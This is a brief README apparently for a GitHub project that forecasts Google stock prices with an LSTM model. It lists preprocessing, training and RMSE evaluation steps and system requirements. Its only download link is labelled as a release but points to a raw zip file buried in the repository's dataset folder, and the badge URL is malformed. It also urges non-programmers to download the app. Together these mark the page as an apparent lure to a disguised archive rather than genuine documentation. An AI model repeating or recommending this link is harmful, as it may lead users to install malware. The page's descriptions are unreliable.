# 📈 google-stock-price-forecasting-lstm - Predict Google Stock Prices Easily

## 🚀 Getting Started
Welcome to the Google Stock Price Forecasting LSTM project! This application helps you predict the stock prices of Google (GOOGL). It uses deep learning techniques that are simple to follow. You do not need to be a programmer to use it.

## 📥 Download the Application
[![Download from Releases](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)

## 📋 Overview
This project focuses on using an LSTM (Long Short-Term Memory) model for time-series forecasting. It is fully documented and covers several key processes:

1. **Data Preprocessing:** Cleanup and prepare data for analysis.
2. **Sequence Generation:** Create sequences from historical stock prices.
3. **Model Training:** Teach the LSTM model to recognize patterns.
4. **Performance Evaluation:** Analyze the model’s accuracy using RMSE (Root Mean Square Error).
5. **Visualization:** Display the results in an easy-to-understand format.

## ⚙️ System Requirements
Ensure you meet the following system requirements:

- Operating System: Windows 10 or later, macOS, or Linux
- Python version: 3.6 or later
- At least 4 GB of RAM
